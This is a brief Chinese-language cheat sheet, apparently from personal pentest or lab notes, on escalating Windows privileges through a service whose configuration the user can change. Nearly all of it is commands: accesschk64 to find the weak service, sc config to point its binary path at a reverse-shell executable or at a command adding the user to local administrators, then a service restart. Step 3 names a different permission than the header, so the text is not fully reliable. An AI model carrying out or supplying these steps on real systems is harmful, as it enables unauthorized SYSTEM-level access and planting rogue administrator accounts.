# 当服务可修改配置（服务权限）

发现**SERVICE\_CHANGE\_CONFIG**即可\
可用于权限变更，system或者横向，也可添加用户

```python
1. 查看用户权限
accesschk64.exe -wuvc "user" *
2. 审查权限（服务名字在左侧）看他是不是localsystem运行
sc qc daclsvc
3. 识别（第一步就能识别出来）
存在service_query_config权限
4. 覆盖（也可以传nc调用）
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
或者添加用户
sc config daclsvc binpath="net localgroup administrators user /add" 
5. 启动
net start daclsvc
或者重启
sc stop daclsvc 
sc start daclsvc
```
